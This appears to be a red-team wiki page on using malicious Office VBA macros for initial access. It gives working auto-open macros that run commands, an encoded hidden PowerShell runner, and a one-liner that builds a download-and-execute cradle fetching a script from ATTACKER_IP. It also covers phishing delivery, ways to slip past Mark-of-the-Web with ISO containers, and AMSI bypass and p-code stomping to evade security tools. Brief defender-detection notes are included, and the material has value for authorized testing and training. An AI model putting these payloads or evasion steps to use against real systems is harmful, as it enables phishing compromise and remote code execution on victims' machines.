**Malicious Office macros (VBA)** — embed VBA code (Office's built-in Visual Basic scripting) in a Word or Excel document so it runs automatically the moment the file is opened. This was the classic way to get code running on a target, but it is now heavily degraded: since 2022 Office blocks macros by default in any file carrying the Mark-of-the-Web (MOTW) — the tag stamped on files that arrive from the internet or email. So it mostly still works against legacy `.doc`/`.xls` files, documents on internal file shares (which carry no MOTW), or when the document is wrapped in a container that strips MOTW.

## How it works

VBA "auto" procedures fire when the document opens:
- `Document_Open()` / `AutoOpen()` in Word, `Workbook_Open()` / `Auto_Open()` in Excel.

**Reality check (MOTW):** a macro-enabled file downloaded from the internet or email opens in Protected View with macros blocked - the user sees *"SECURITY RISK: Microsoft has blocked macros"* with no "Enable Content" button. To land a macro you need one of: a legacy `.doc`/`.xls` (OLE format, sometimes still gets the enable prompt), delivery over a channel that does not set MOTW (internal SMB share, some sync clients), or wrapping the doc in an [ISO/container](ISO%20and%20Container%20Files.md) so the extracted file has no MOTW. [Remote Template Injection](Remote%20Template%20Injection.md) is the modern cousin that ships a clean `.docx`.

## Setup

1. New document → **Save As** → `Word 97-2003 Document (*.doc)` (OLE format).
2. **View → Macros** (or **Developer → Visual Basic**) → create in *This Document*.

**Run a command:**

```vba

Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    CreateObject("Wscript.Shell").Run "cmd"
End Sub

```

**Encoded PowerShell runner** (base64 is UTF-16LE, produced by e.g. `msfvenom -f psh-cmd` or a Cobalt/Sliver stager). Split long strings to dodge the VBA 255-char line limit:

```vba

Sub MyMacro()
    Dim Str As String
    Str = Str + "powershell.exe -nop -w hidden -e JABjAGwAaQBlAG4Ad"
    Str = Str + "AAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdAB"
    Str = Str + "lAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDA"
    ' ... remaining base64 chunks ...
    CreateObject("Wscript.Shell").Run Str, 0
End Sub

```

Generate the encoded blob on Linux:

```bash

# UTF-16LE base64 for -EncodedCommand
echo -n "IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/a.ps1')" | iconv -t utf-16le | base64 -w0

```

## Delivery

- Attach the `.doc` to a pretext email, or host it on an internal share (no MOTW) after an initial foothold.
- If MOTW is in play, deliver inside an [ISO/IMG/VHD](ISO%20and%20Container%20Files.md).
- Always craft a **fresh** document - reused/edited docs accumulate suspicious metadata and VBA artifacts.

## Detection & OPSEC

- Macro execution from Office is a top EDR/AV signal; the encoded-PowerShell child process off `WINWORD.EXE` is the classic detection.
- **AMSI** inspects VBA and the PowerShell it spawns - obfuscate or use AMSI bypass in the stager.
- Strip VBA metadata / stomp p-code with **EvilClippy** (`EvilClippy.exe -s clean.vba doc.doc`) or purge with **oletools** (`olevba` also lets defenders read your macro - assume they will).
- Blue team: `olevba` / `oledump.py` extract and score macros; hunt `WINWORD.EXE`/`EXCEL.EXE` spawning `powershell`, `wscript`, `cmd`, `mshta`, `rundll32`.

## References

- The Hacker Recipes - Initial access (phishing) - https://www.thehacker.recipes/infra/phishing
- Microsoft - Macros from the internet blocked by default - https://learn.microsoft.com/en-us/deployoffice/security/internet-macros-blocked
- EvilClippy - https://github.com/outflanknl/EvilClippy
- oletools (olevba) - https://github.com/decalage2/oletools
